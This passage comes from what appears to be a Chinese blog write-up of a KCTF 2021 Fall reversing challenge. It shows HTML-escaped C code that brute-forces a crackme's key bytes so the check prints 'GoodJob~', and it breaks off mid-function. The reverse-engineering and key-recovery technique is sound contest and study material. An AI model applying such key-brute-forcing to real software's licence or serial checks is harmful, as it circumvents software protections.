  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; v22 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAC&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; v23 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; v24 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC8u&lt;/span&gt; ){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
      printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%hhX&amp;#34;&lt;/span&gt;, a2[i]);
    }
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}


&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; flag[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xa3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xd2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xfb&lt;/span&gt;};
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;{
    memset(byte_404420, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65536&lt;/span&gt;);
    sub_401580(flag);
  }&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (next_permutation(flag, flag &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;));
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;转换一下得到前八字节 &lt;code&gt;B4D682C8BF2DE13A&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;确定前八字节后，只需要关注和参数（后八字节）有关的部分了，中间全部动调跳过&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 113; 
			flex-basis: 273px&#34;
	&gt;
	&lt;a href=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117014358505.png&#34; data-size=&#34;1062x933&#34;&gt;
		&lt;img src=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117014358505.png&#34;
			width=&#34;1062&#34;
			height=&#34;933&#34;
			srcset=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117014358505_hu9a802c677e724eac88e42ebe00c53717_83085_480x0_resize_box_3.png 480w, /post/two-challenges-in-kctf2021-fall/image-20211117014358505_hu9a802c677e724eac88e42ebe00c53717_83085_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这一部分程序相较来说就简单了不少，主要是根据404000开头的八个字节作为初始值，每个字节单独与输入的八个字节进行运算，根据末尾bit决定是+1还是找索引，最终目的是凑成 &lt;code&gt;GoodJob~&lt;/code&gt; 这个字符串（&lt;code&gt;sub_4024C0&lt;/code&gt; 是个字符串比较）&lt;/p&gt;
&lt;p&gt;可以使用搜索之类的，但考虑到每个字节是单独运算的，常规爆破也只需要 &lt;code&gt;0x800&lt;/code&gt; 的运算量，所以还是直接爆破了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; byte_414420[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0xC1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;};

&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; byte_404000[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEB&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x85&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8C&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3C&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBE&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x62&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFE&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2B&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4F&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x94&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0B&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x53&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x89&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7C&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE5&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x84&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x88&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xED&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5D&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x97&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB2&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x92&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF4&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x96&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA2&lt;/span&gt;
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;calc&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; a2, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i){
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v17; &lt;span style=&#34;color:#75715e&#34;&gt;// esi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v19; &lt;span style=&#34;color:#75715e&#34;&gt;// dl
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
    {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v17 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; )
        {
